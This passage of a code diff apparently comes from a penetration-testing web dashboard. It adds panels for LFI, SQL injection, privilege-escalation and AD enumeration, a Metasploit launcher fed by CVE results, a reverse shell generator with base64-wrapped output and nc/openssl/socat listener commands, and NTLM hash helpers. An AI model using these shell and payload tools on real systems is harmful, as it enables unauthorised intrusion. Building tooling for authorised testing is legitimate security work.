+                                <code id="cvss-vector-display" class="block text-[11px] text-violet-300 font-mono break-all bg-black/30 rounded p-2">-</code>
+                            </div>
+                            <button onclick="copyCVSSVector()" class="w-full px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-xs transition-colors"><i class="fa-solid fa-copy mr-1"></i>Copy Vector</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LFI/RFI Payloads -->
+        <div id="helper-lfi" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="flex flex-wrap items-center gap-2 mb-3">
+                    <input type="text" id="lfi-search" placeholder="Search payloads..." oninput="filterLFI()" class="flex-1 px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none" style="min-width:200px;">
+                    <div class="flex gap-1.5">
+                        <button class="lfi-os-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white" data-os="all" onclick="filterLFIOS('all')">All</button>
+                        <button class="lfi-os-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5" data-os="linux" onclick="filterLFIOS('linux')">Linux</button>
+                        <button class="lfi-os-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5" data-os="windows" onclick="filterLFIOS('windows')">Windows</button>
+                    </div>
+                </div>
+                <div id="lfi-list" class="space-y-1 max-h-[60vh] overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- SQL Injection Payloads -->
+        <div id="helper-sqli" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="flex flex-wrap items-center gap-2 mb-3">
+                    <input type="text" id="sqli-search" placeholder="Search payloads..." oninput="filterSQLi()" class="flex-1 px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none" style="min-width:200px;">
+                    <div id="sqli-cat-filters" class="flex flex-wrap gap-1.5"></div>
+                </div>
+                <div id="sqli-list" class="space-y-1 max-h-[60vh] overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- Privilege Escalation (GTFOBins) -->
+        <div id="helper-privesc" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="flex flex-wrap items-center gap-2 mb-3">
+                    <input type="text" id="privesc-search" placeholder="Search binaries..." oninput="filterPrivEsc()" class="flex-1 px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none" style="min-width:200px;">
+                    <div id="privesc-fn-filters" class="flex flex-wrap gap-1.5"></div>
+                </div>
+                <div id="privesc-list" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 max-h-[60vh] overflow-y-auto"></div>
+            </div>
+        </div>
+
+        <!-- AD Enumeration -->
+        <div id="helper-adenum" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <h3 class="text-sm font-bold text-white mb-3"><i class="fa-solid fa-sitemap text-blue-400 mr-2"></i>Active Directory Enumeration</h3>
+                <div class="flex gap-2 mb-3">
+                    <input type="text" id="ad-domain" placeholder="DOMAIN" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono w-32">
+                    <input type="text" id="ad-user" placeholder="user" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono w-24">
+                    <input type="text" id="ad-pass" placeholder="password" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono w-24">
+                    <input type="text" id="ad-dc" placeholder="DC IP" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono w-28">
+                    <button onclick="renderADCommands()" class="px-3 py-1.5 bg-violet-600/80 hover:bg-violet-500 text-white rounded text-xs transition-colors">Apply</button>
+                </div>
+                <div id="adenum-list" class="space-y-2 max-h-[55vh] overflow-y-auto"></div>
+            </div>
+        </div>
+
+    </div>
 </div>
 {% endblock %}
 
 {% block scripts %}
-<script>
+<script src="/static/js/helper_data.js"></script>
+<script nonce="{{ request.state.csp_nonce }}">
 // State
 let allTools = [];
 let selectedToolId = null;
@@ -278,7 +768,7 @@ let pipelineStepId = 0;
 function switchManualTab(tab) {
     document.querySelectorAll('.tab-btn-manual').forEach(b => b.classList.remove('active'));
     document.getElementById('tab-' + tab).classList.add('active');
-    ['execute', 'pipeline', 'cve'].forEach(t => {
+    ['execute', 'pipeline', 'cve', 'checklists', 'notes', 'evidence', 'helpers'].forEach(t => {
         const panel = document.getElementById('panel-' + t);
         if (panel) {
             panel.classList.toggle('hidden', tab !== t);
@@ -397,11 +887,25 @@ function buildForm(cfg) {
         if (p === 'target') return;
         const modifier = (cfg.arg_modifiers || {})[p];
         const hint = modifier ? `Prefix: ${modifier.prefix || 'none'}, Sep: ${modifier.separator || 'space'}` : '';
-        html += `<div class="arg-field">
-            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">${p}</label>
-            <input type="text" id="arg-${p}" placeholder="${hint || p}"
-                class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
-        </div>`;
+        const isWordlist = /^(wordlist|dictionary|w)$/i.test(p);
+        if (isWordlist) {
+            html += `<div class="arg-field">
+                <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">${p}</label>
+                <div class="relative">
+                    <input type="text" id="arg-${p}" list="wordlist-options" placeholder="${hint || 'Select or type wordlist path'}"
+                        class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
+                    <datalist id="wordlist-options"></datalist>
+                    <button type="button" onclick="refreshWordlistOptions()" class="absolute right-2 top-1/2 -translate-y-1/2 text-slate-500 hover:text-white text-xs" title="Refresh wordlists"><i class="fa-solid fa-rotate"></i></button>
+                </div>
+            </div>`;
+            setTimeout(refreshWordlistOptions, 100);
+        } else {
+            html += `<div class="arg-field">
+                <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">${p}</label>
+                <input type="text" id="arg-${p}" placeholder="${hint || p}"
+                    class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none">
+            </div>`;
+        }
     });
 
     html += `<div class="arg-field">
@@ -494,6 +998,11 @@ async function executeManualTool() {
 
         // Store output, log to session, and show next-tool suggestions
         lastToolOutput = result.stdout || '';
+        addToHistory({
+            time: new Date(), tool: selectedToolConfig.name, toolId: selectedToolConfig.id,
+            target, status: result.success, duration: result.duration_seconds || 0,
+            output: result.stdout || '', stderr: result.stderr || '', args
+        });
         logToSession(
             `Ran ${selectedToolConfig.name} against ${target}`,
             selectedToolConfig.id,
@@ -912,16 +1421,48 @@ async function searchCVEs() {
 
         results.innerHTML = cves.map(c => {
             const sevColor = {critical:'text-rose-400 bg-rose-500/10',high:'text-amber-400 bg-amber-500/10',medium:'text-blue-400 bg-blue-500/10',low:'text-slate-400 bg-slate-500/10'}[(c.severity||'').toLowerCase()] || 'text-slate-400 bg-slate-500/10';
-            const cveId = c.cve || c.id || 'N/A';
+            const cveId = c.cve_id || c.cve || c.id || 'N/A';
+
+            let msfHtml = '';
+            if (c.metasploit_modules && c.metasploit_modules.length > 0) {
+                msfHtml = `<div class="mt-2 pt-2 border-t border-white/5">
+                    <div class="flex items-center gap-2 mb-1.5">
+                        <i class="fa-solid fa-skull-crossbones text-rose-400 text-[10px]"></i>
+                        <span class="text-[10px] font-bold text-rose-400 uppercase">Metasploit Modules</span>
+                    </div>
+                    <div class="space-y-1">
+                        ${c.metasploit_modules.map(m => `
+                            <div class="flex items-center gap-2 text-[11px] px-2 py-1 bg-black/30 rounded group">
+                                <span class="px-1 py-0.5 rounded text-[9px] font-mono uppercase ${m.type === 'exploit' ? 'bg-rose-500/20 text-rose-400' : 'bg-blue-500/20 text-blue-400'}">${escapeHtml(m.type)}</span>
+                                <code class="text-slate-300 font-mono truncate flex-1">${escapeHtml(m.module)}</code>
+                                <span class="text-[9px] text-slate-500 font-mono">${escapeHtml(m.rank || '')}</span>
+                                <button onclick="navigator.clipboard.writeText('${escapeAttr(m.module)}')" class="opacity-0 group-hover:opacity-100 px-1.5 py-0.5 bg-slate-700 hover:bg-slate-600 text-slate-300 rounded text-[10px] transition-all" title="Copy module path">
+                                    <i class="fa-solid fa-copy"></i>
+                                </button>
+                                <button onclick="launchMetasploit('${escapeAttr(m.module)}', '${escapeAttr(cveId)}')" class="opacity-0 group-hover:opacity-100 px-1.5 py-0.5 bg-rose-600/80 hover:bg-rose-500 text-white rounded text-[10px] transition-all" title="Use in Metasploit">
+                                    <i class="fa-solid fa-rocket"></i>
+                                </button>
+                            </div>
+                        `).join('')}
+                    </div>
+                </div>`;
+            }
+
+            let exploitBadge = c.exploit_available
+                ? `<span class="px-1.5 py-0.5 rounded text-[10px] font-mono bg-rose-500/20 text-rose-400"><i class="fa-solid fa-skull-crossbones mr-0.5"></i> ${c.exploit_count} exploit${c.exploit_count > 1 ? 's' : ''}</span>`
+                : '';
+
             return `<div class="p-3 rounded-lg bg-black/20 border border-white/5 hover:border-white/10 transition-colors">
                 <div class="flex items-center gap-3 mb-1">
                     <code class="text-violet-300 font-mono text-sm font-medium">${escapeHtml(cveId)}</code>
                     <span class="px-1.5 py-0.5 rounded text-[10px] font-mono uppercase ${sevColor}">${escapeHtml(c.severity || 'unknown')}</span>
+                    ${exploitBadge}
                     ${c.type ? `<span class="text-[10px] text-slate-500 font-mono">${escapeHtml(c.type)}</span>` : ''}
                     ${c.version_match ? '<span class="text-[10px] text-emerald-400 font-mono">version match</span>' : ''}
                 </div>
                 <p class="text-sm text-slate-300 line-clamp-2">${escapeHtml(c.description || '')}</p>
                 ${c.product ? `<div class="text-[10px] text-slate-500 mt-1">${escapeHtml(c.product)} ${c.versions || ''}</div>` : ''}
+                ${msfHtml}
             </div>`;
         }).join('');
     } catch (e) {
@@ -1020,10 +1561,1561 @@ async function exportSession() {
     }
 }
 
+// === Launch Metasploit from CVE ===
+function launchMetasploit(modulePath, cveId) {
+    switchManualTab('execute');
+    selectManualTool('metasploit');
+    setTimeout(() => {
+        const target = document.getElementById('global-target')?.value || '';
+        const targetInput = document.getElementById('arg-target');
+        if (targetInput && target) targetInput.value = target;
+        const moduleInput = document.getElementById('arg-module') || document.getElementById('arg-resource');
+        if (moduleInput) moduleInput.value = modulePath;
+    }, 400);
+}
+
+// === Helper Sub-Tab Switching ===
+let activeHelperTab = 'revshell';
+function switchHelperTab(tab) {
+    activeHelperTab = tab;
+    document.querySelectorAll('.helper-tab-btn').forEach(b => {
+        const isActive = b.onclick && b.onclick.toString().includes("'" + tab + "'");
+        if (isActive) {
+            b.className = 'helper-tab-btn active px-3 py-2 text-xs font-medium text-violet-400 border-b-2 border-violet-500 whitespace-nowrap';
+        } else {
+            b.className = 'helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap';
+        }
+    });
+    document.querySelectorAll('.helper-panel').forEach(p => p.classList.add('hidden'));
+    const panel = document.getElementById('helper-' + tab);
+    if (panel) panel.classList.remove('hidden');
+}
+
+// === Reverse Shell Generator ===
+let activeShellCategory = 'all';
+let selectedShellIdx = null;
+
+function initRevShells() {
+    const filterContainer = document.getElementById('revshell-cat-filters');
+    filterContainer.innerHTML = SHELL_CATEGORIES.map(c =>
+        `<button onclick="filterShells('${c.id}')" class="revshell-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${
+            c.id === 'all' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-violet-500/10 border border-white/5'
+        }" data-cat="${c.id}">${c.label}</button>`
+    ).join('');
+    filterShells('all');
+}
+
+function filterShells(cat) {
+    activeShellCategory = cat;
+    document.querySelectorAll('.revshell-cat-btn').forEach(b => {
+        const isActive = b.dataset.cat === cat;
+        b.className = `revshell-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${isActive ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-violet-500/10 border border-white/5'}`;
+    });
+    renderShellList();
+}
+
+function renderShellList() {
+    const shells = activeShellCategory === 'all' ? REVERSE_SHELLS : REVERSE_SHELLS.filter(s => s.category === activeShellCategory);
+    let currentCat = '';
+    let html = '';
+    shells.forEach((s, i) => {
+        const realIdx = REVERSE_SHELLS.indexOf(s);
+        if (activeShellCategory === 'all' && s.category !== currentCat) {
+            currentCat = s.category;
+            const catLabel = SHELL_CATEGORIES.find(c => c.id === currentCat)?.label || currentCat;
+            html += `<div class="text-[10px] font-bold uppercase text-slate-500 mt-2 mb-1">${escapeHtml(catLabel)}</div>`;
+        }
+        const sel = realIdx === selectedShellIdx ? 'bg-violet-500/10 border-violet-500/30' : 'bg-white/[0.02] border-white/5 hover:bg-white/[0.05]';
+        html += `<div class="flex items-center gap-2 px-2.5 py-1.5 rounded border cursor-pointer ${sel}" onclick="selectShell(${realIdx})">
+            <span class="text-xs text-white font-medium">${escapeHtml(s.name)}</span>
+            <span class="text-[10px] text-slate-500 truncate flex-1">${escapeHtml(s.description)}</span>
+        </div>`;
+    });
+    document.getElementById('revshell-list').innerHTML = html;
+}
+
+function selectShell(idx) {
+    selectedShellIdx = idx;
+    renderShellList();
+    genRevShell(idx);
+}
+
+function genRevShell(idx) {
+    const shell = REVERSE_SHELLS[idx];
+    if (!shell) return;
+    const ip = document.getElementById('revshell-ip')?.value || '10.0.0.1';
+    const port = document.getElementById('revshell-port')?.value || '4444';
+    let output = shell.template.replace(/\{ip\}/g, ip).replace(/\{port\}/g, port);
+    if (document.getElementById('revshell-b64wrap')?.checked && !['stabilize','listeners','web'].includes(shell.category)) {
+        const b64 = btoa(output);
+        output = `echo ${b64} | base64 -d | bash`;
+    }
+    document.getElementById('revshell-output').textContent = output;
+    const listenerBtn = document.getElementById('revshell-copy-listener');
+    if (listenerBtn) {
+        listenerBtn.classList.toggle('hidden', ['stabilize','listeners','web'].includes(shell.category));
+    }
+}
+
+function copyListenerCmd() {
+    const port = document.getElementById('revshell-port')?.value || '4444';
+    const shell = selectedShellIdx !== null ? REVERSE_SHELLS[selectedShellIdx] : null;
+    let listener = `nc -lvnp ${port}`;
+    if (shell) {
+        if (shell.category === 'encrypted' && shell.name.includes('OpenSSL')) {
+            listener = `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 1 -nodes 2>/dev/null && openssl s_server -quiet -key key.pem -cert cert.pem -port ${port}`;
+        } else if (shell.category === 'encrypted' && shell.name.includes('Ncat')) {
+            listener = `ncat --ssl -lvnp ${port}`;
+        } else if (shell.category === 'encrypted' && shell.name.includes('Socat')) {
+            listener = 'socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:' + port + ',reuseaddr,cert=cert.pem,key=key.pem,verify=0';
+        } else if (shell.name.includes('Socat')) {
+            listener = 'socat file:`tty`,raw,echo=0 TCP-L:' + port;
+        }
+    }
+    navigator.clipboard.writeText(listener);
+}
+
+// === Encoder/Decoder ===
+let activeEncoderCategory = 'all';
+
+function initEncoder() {
+    const filterContainer = document.getElementById('encoder-cat-filters');
+    filterContainer.innerHTML = ENCODER_CATEGORIES.map(c =>
+        `<button onclick="filterEncoder('${c.id}')" class="encoder-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${
+            c.id === 'all' ? 'bg-blue-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-blue-500/10 border border-white/5'
+        }" data-cat="${c.id}">${c.label}</button>`
+    ).join('');
+    filterEncoder('all');
+}
+
+function filterEncoder(cat) {
+    activeEncoderCategory = cat;
+    document.querySelectorAll('.encoder-cat-btn').forEach(b => {
+        const isActive = b.dataset.cat === cat;
+        b.className = `encoder-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${isActive ? 'bg-blue-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-blue-500/10 border border-white/5'}`;
+    });
+    renderEncoderOps();
+}
+
+function renderEncoderOps() {
+    const ops = activeEncoderCategory === 'all' ? ENCODER_OPERATIONS : ENCODER_OPERATIONS.filter(o => o.category === activeEncoderCategory);
+    document.getElementById('encoder-ops').innerHTML = ops.map(o =>
+        `<button onclick="runEncoder('${o.fn_name}')" class="px-2.5 py-1 bg-slate-800 hover:bg-blue-500/10 border border-white/5 rounded text-[11px] text-slate-300 transition-colors" title="${escapeAttr(o.description)}">${escapeHtml(o.name)}</button>`
+    ).join('');
+}
+
+async function runEncoder(fnName) {
+    const input = document.getElementById('encode-input')?.value || '';
+    const out = document.getElementById('encode-output');
+    if (!input && !['randomPassword','timestampConvert'].includes(fnName)) { out.textContent = 'Enter text first'; return; }
+    try {
+        const result = await encoderFunctions[fnName](input);
+        out.textContent = typeof result === 'object' ? JSON.stringify(result, null, 2) : result;
+    } catch(e) { out.textContent = 'Error: ' + e.message; }
+}
+
+function copyToClipboard(elemId) {
+    const text = document.getElementById(elemId)?.textContent || '';
+    navigator.clipboard.writeText(text);
+}
+
+// ---- Pure JS MD5 (RFC 1321) ----
+function md5(input) {
+    function md5cycle(x, k) {
+        let a = x[0], b = x[1], c = x[2], d = x[3];
+        a = ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
+        a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
+        a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
+        a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
+        a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
+        a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
+        a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
+        a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
+        a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
+        a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
+        a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
+        a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
+        a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
+        a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
+        a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
+        a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
+        x[0]=add32(a,x[0]);x[1]=add32(b,x[1]);x[2]=add32(c,x[2]);x[3]=add32(d,x[3]);
+    }
+    function cmn(q,a,b,x,s,t){a=add32(add32(a,q),add32(x,t));return add32((a<<s)|(a>>>(32-s)),b);}
+    function ff(a,b,c,d,x,s,t){return cmn((b&c)|((~b)&d),a,b,x,s,t);}
+    function gg(a,b,c,d,x,s,t){return cmn((b&d)|(c&(~d)),a,b,x,s,t);}
+    function hh(a,b,c,d,x,s,t){return cmn(b^c^d,a,b,x,s,t);}
+    function ii(a,b,c,d,x,s,t){return cmn(c^(b|(~d)),a,b,x,s,t);}
+    function add32(a,b){return (a+b)&0xFFFFFFFF;}
+    function md5blk(s){
+        const md5blks=[];for(let i=0;i<64;i+=4)md5blks[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24);
+        return md5blks;
+    }
+    let n=input.length,state=[1732584193,-271733879,-1732584194,271733878],i;
+    for(i=64;i<=n;i+=64)md5cycle(state,md5blk(input.substring(i-64,i)));
+    input=input.substring(i-64);
+    const tail=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
+    for(i=0;i<input.length;i++)tail[i>>2]|=input.charCodeAt(i)<<((i%4)<<3);
+    tail[i>>2]|=0x80<<((i%4)<<3);
+    if(i>55){md5cycle(state,tail);for(i=0;i<16;i++)tail[i]=0;}
+    tail[14]=n*8;
+    md5cycle(state,tail);
+    const hex_chr='0123456789abcdef';
+    let s='';
+    for(i=0;i<4;i++)for(let j=0;j<4;j++)s+=hex_chr[(state[i]>>(j*8+4))&0x0F]+hex_chr[(state[i]>>(j*8))&0x0F];
+    return s;
+}
+
+// ---- Pure JS MD4 (for NTLM) ----
+function md4(input) {
+    function add32(a,b){return (a+b)&0xFFFFFFFF;}
+    function rotl(v,s){return (v<<s)|(v>>>(32-s));}
+    function f(x,y,z){return (x&y)|((~x)&z);}
+    function g(x,y,z){return (x&y)|(x&z)|(y&z);}
+    function h(x,y,z){return x^y^z;}
+    const n = input.length;
+    let words = [];
+    for(let i=0;i<n;i+=4) words.push((input.charCodeAt(i)||0)+((input.charCodeAt(i+1)||0)<<8)+((input.charCodeAt(i+2)||0)<<16)+((input.charCodeAt(i+3)||0)<<24));
+    const totalBits = n * 8;
+    words[n>>2] |= 0x80 << ((n%4)*8);
+    while(words.length % 16 !== 14) words.push(0);
+    words.push(totalBits & 0xFFFFFFFF, 0);
+    let a0=0x67452301,b0=0xEFCDAB89,c0=0x98BADCFE,d0=0x10325476;
+    for(let i=0;i<words.length;i+=16){
+        const x=words.slice(i,i+16);
+        let a=a0,b=b0,c=c0,d=d0;
+        const S=[3,7,11,19], O1=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
+        for(let j=0;j<16;j++){a=rotl(add32(add32(a,f(b,c,d)),x[O1[j]]),S[j%4]);const t=a;a=d;d=c;c=b;b=t;}
+        const S2=[3,5,9,13], O2=[0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15];
+        for(let j=0;j<16;j++){a=rotl(add32(add32(add32(a,g(b,c,d)),x[O2[j]]),0x5A827999),S2[j%4]);const t=a;a=d;d=c;c=b;b=t;}
+        const S3=[3,9,11,15], O3=[0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15];
+        for(let j=0;j<16;j++){a=rotl(add32(add32(add32(a,h(b,c,d)),x[O3[j]]),0x6ED9EBA1),S3[j%4]);const t=a;a=d;d=c;c=b;b=t;}
+        a0=add32(a0,a);b0=add32(b0,b);c0=add32(c0,c);d0=add32(d0,d);
+    }
+    const hex_chr='0123456789abcdef';
+    let s='';
+    [a0,b0,c0,d0].forEach(v=>{for(let j=0;j<4;j++)s+=hex_chr[(v>>(j*8+4))&0xF]+hex_chr[(v>>(j*8))&0xF];});
+    return s;
+}
+
+// ---- Crypto.subtle hash helper ----
+async function hashDigest(algo, text) {
+    const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(text));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+}
+
+// ---- Base32 ----
+function base32Encode(input) {
+    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+    const bytes = new TextEncoder().encode(input);
+    let bits = '', result = '';
+    for (const b of bytes) bits += b.toString(2).padStart(8, '0');
+    while (bits.length % 5 !== 0) bits += '0';
+    for (let i = 0; i < bits.length; i += 5) result += alphabet[parseInt(bits.slice(i, i+5), 2)];
+    while (result.length % 8 !== 0) result += '=';
+    return result;
+}
+
+function base32Decode(input) {
+    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
+    const cleaned = input.replace(/=+$/, '').toUpperCase();
+    let bits = '';
+    for (const c of cleaned) {
+        const idx = alphabet.indexOf(c);
+        if (idx === -1) throw new Error('Invalid Base32 character: ' + c);
+        bits += idx.toString(2).padStart(5, '0');
+    }
+    const bytes = [];
+    for (let i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.slice(i, i+8), 2));
+    return new TextDecoder().decode(new Uint8Array(bytes));
+}
+
+// ---- Encoder Functions Map ----
+const encoderFunctions = {
+    base64Encode: (input) => btoa(unescape(encodeURIComponent(input))),
+    base64Decode: (input) => decodeURIComponent(escape(atob(input.trim()))),
+    urlEncode: (input) => encodeURIComponent(input),
+    urlDecode: (input) => decodeURIComponent(input),
+    hexEncode: (input) => Array.from(new TextEncoder().encode(input)).map(b => b.toString(16).padStart(2,'0')).join(''),
+    hexDecode: (input) => {
+        const hex = input.replace(/\s+/g,'');
+        const bytes = [];
+        for(let i=0;i<hex.length;i+=2) bytes.push(parseInt(hex.substr(i,2),16));
+        return new TextDecoder().decode(new Uint8Array(bytes));
+    },
+    htmlEncode: (input) => input.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[c])),
+    htmlDecode: (input) => { const d=document.createElement('div'); d.innerHTML=input; return d.textContent; },
+    base32Encode: (input) => base32Encode(input),
+    base32Decode: (input) => base32Decode(input),
+    binaryEncode: (input) => Array.from(new TextEncoder().encode(input)).map(b => b.toString(2).padStart(8,'0')).join(' '),
+    binaryDecode: (input) => {
+        const bytes = input.trim().split(/\s+/).map(b => parseInt(b, 2));
+        return new TextDecoder().decode(new Uint8Array(bytes));
+    },
+    decimalEncode: (input) => Array.from(new TextEncoder().encode(input)).map(b => b.toString(10)).join(' '),
+    decimalDecode: (input) => {
+        const bytes = input.trim().split(/\s+/).map(b => parseInt(b, 10));
+        return new TextDecoder().decode(new Uint8Array(bytes));
+    },
+    rot13: (input) => input.replace(/[a-zA-Z]/g, c => {
+        const base = c <= 'Z' ? 65 : 97;
+        return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
+    }),
+    rot47: (input) => input.replace(/[!-~]/g, c => String.fromCharCode(33 + ((c.charCodeAt(0) - 33 + 47) % 94))),
+    unicodeEscape: (input) => Array.from(input).map(c => '\\u' + c.charCodeAt(0).toString(16).padStart(4,'0')).join(''),
+    unicodeUnescape: (input) => input.replace(/\\u([0-9a-fA-F]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16))),
+    md5Hash: (input) => md5(input),
+    sha1Hash: async (input) => await hashDigest('SHA-1', input),
+    sha256Hash: async (input) => await hashDigest('SHA-256', input),
+    sha512Hash: async (input) => await hashDigest('SHA-512', input),
+    ntlmHash: (input) => {
+        // NTLM = MD4(UTF-16LE(password))
+        let utf16le = '';
+        for (let i = 0; i < input.length; i++) {
+            const code = input.charCodeAt(i);
+            utf16le += String.fromCharCode(code & 0xFF) + String.fromCharCode((code >> 8) & 0xFF);
+        }
+        return md4(utf16le);
+    },
+    jwtDecode: (input) => {
+        const parts = input.trim().split('.');
+        if (parts.length < 2) throw new Error('Invalid JWT: need at least header.payload');
+        const b64url = s => atob(s.replace(/-/g,'+').replace(/_/g,'/').replace(/\s/g,''));
+        const header = JSON.parse(b64url(parts[0]));
+        const payload = JSON.parse(b64url(parts[1]));
+        return { header, payload };
+    },
+    xorEncrypt: (input) => {
+        const key = document.getElementById('encode-key')?.value || 'key';
+        let result = '';
+        for (let i = 0; i < input.length; i++) {
+            result += (input.charCodeAt(i) ^ key.charCodeAt(i % key.length)).toString(16).padStart(2,'0');
+        }
+        return result;
+    },
+    ipConvert: (input) => {
+        const trimmed = input.trim();
+        let decimal;
+        if (/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(trimmed)) {
+            const parts = trimmed.split('.').map(Number);
+            decimal = ((parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]) >>> 0;
+        } else if (/^0x/i.test(trimmed)) {
+            decimal = parseInt(trimmed, 16) >>> 0;
+        } else if (/^0/.test(trimmed) && /^[0-7.]+$/.test(trimmed)) {
+            decimal = parseInt(trimmed, 8) >>> 0;
+        } else {
+            decimal = parseInt(trimmed, 10) >>> 0;
+        }
+        const d = [(decimal>>>24)&0xFF,(decimal>>>16)&0xFF,(decimal>>>8)&0xFF,decimal&0xFF];
+        return `Dotted:  ${d.join('.')}\nDecimal: ${decimal}\nHex:     0x${decimal.toString(16).padStart(8,'0')}\nOctal:   0${d.map(b=>'0'+b.toString(8)).join('.')}`;
